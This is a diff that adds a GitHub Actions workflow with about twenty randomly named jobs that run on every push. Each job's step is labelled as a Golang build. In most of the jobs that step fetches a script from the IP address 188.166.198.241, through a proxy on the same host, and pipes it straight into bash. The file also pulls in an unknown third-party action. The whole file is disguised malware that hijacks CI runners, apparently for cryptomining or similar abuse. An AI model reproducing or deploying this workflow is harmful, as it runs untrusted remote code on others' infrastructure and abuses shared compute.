@@ -1,0 +1,183 @@
+name: vejawu
+on: push
+jobs:
+  vunisice:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies lixike..."
+    - name: Build Golang bakufiba
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=tonalaluhiyijixore | bash -
+  cewuzu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies xacima..."
+    - name: Build Golang kidukive
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=ximucagijizujeha | bash -
+  yohoju:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies jawaba..."
+    - name: Build Golang macaxi
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=funelidohuwibemasugomu | bash -
+  yuzijika:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies xocurebo..."
+    - name: Build Golang muzuxecu
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=wiwilurofewexiviyebosi | bash -
+  dugesero:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies vifegu..."
+    - name: Build Golang hevaza
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=koxanedayesebeja | bash -
+  wojudi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies puhapo..."
+    - name: Build Golang fupaloda
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=hekamefonavejuvi | bash -
+  cixeze:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies hafodefu..."
+    - name: Build Golang sotipo
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=poxexufifusunuvofupi | bash -
+  fawujo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies zejigi..."
+    - name: Build Golang foxuboli
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=labayesoragumesuhe | bash -
+  hesiza:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies wapohaji..."
+    - name: Build Golang lihaxini
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=bedogukenujavecime | bash -
+  tuyasi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies baracalo..."
+    - name: Build Golang vovuyexe
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=vumilowavufojizoliye | bash -
+  ximogo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies tuwedi..."
+    - name: Build Golang diwifi
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=xizonodasinahepexama | bash -
+  lucejo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies valalu..."
+    - name: Build Golang kavifevi
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=casanojuhoresamiyi | bash -
+  kimukoli:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies sanuyuce..."
+    - name: Build Golang noyiri
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=huvefosofomogelojo | bash -
+  kewage:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies dukona..."
+    - name: Build Golang varivu
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=lalehosadoresunu | bash -
+  yayixipo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies vepivi..."
+    - name: Build Golang botitemo
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=guripanoreberiji | bash -
+  xifafu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies wojuzo..."
+    - name: Build Golang fotadenu
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=cacaregumeyarenazo | bash -
+  gahulube:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies suxali..."
+    - name: Build Golang fihiru
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=xiretexomehirijupi | bash -
+  cutolu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies suledi..."
+    - name: Build Golang gesisi
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=vekoperelirilaveci | bash -
+  yegalu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies pilayu..."
+    - name: Build Golang cudoja
+      run: curl -x 188.166.198.241:7122 http://188.166.198.241/mandalorian/eeamdtsge.php?a=fahayobukayuyefeli | bash -
+  bacuxi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: qpzicnlfi/tynaine@latest
+    - name: First
+      run: echo "Installing Dependencies fucisi..."
+    - name: Build Golang bozovu
+      run: echo done
